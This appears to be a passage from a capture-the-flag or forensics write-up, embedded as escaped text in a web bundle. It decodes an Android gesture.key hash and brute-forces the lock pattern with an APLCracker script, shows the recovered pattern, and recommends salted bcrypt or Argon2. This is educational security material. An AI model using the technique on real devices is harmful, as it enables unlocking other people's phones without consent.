bytes:\\r\\n    \\r\\n    `echo \\"agYrmzRS42ZAcYGhv5Lqc+ntTEg=\\" | base64 -d > gesture.key`\\r\\n    \\r\\n- **Run APLCracker to brute-force the pattern:**\\r\\n\\r\\n```bash\\r\\npython2 aplc.py gesture.key\\r\\n\\r\\n## [:D] The pattern has been FOUND!!! => 0124678\\r\\n\\r\\n## [+] Gesture:\\r\\n## | 1 | 2 | 3 |\\r\\n## | 4 |   |   |\\r\\n## | 5 | 6 | 7 |\\r\\n```\\r\\n\\r\\n---\\r\\n\\r\\n<aside>\\r\\n\u{1F4A1}\\r\\n\\r\\nA secure implementation would use a modern algorithm like **`bcrypt` or `Argon2**` with a random salt, making brute-force computationally infeasible even with the same small keyspace.\\r\\n\\r\\n</aside>"}]}}')}}]);